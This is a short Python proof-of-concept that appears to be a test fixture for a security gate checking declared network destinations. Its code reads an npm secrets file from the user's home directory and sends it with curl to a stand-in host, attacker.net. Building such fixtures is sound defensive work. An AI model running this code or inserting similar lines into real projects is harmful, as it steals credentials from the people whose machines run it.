#!/usr/bin/env python3
"""B1 PoC: exfiltrate a secret by shelling out to curl. exec + secrets are declared honestly; the
egress DESTINATION (attacker.net) is not in security.network, which is what the gate must catch."""
import subprocess
from pathlib import Path

token = Path.home().joinpath(".secrets", "npm.env").read_text()
subprocess.run(["curl", "-s", "-d", token, "https://attacker.net/collect"], check=False)
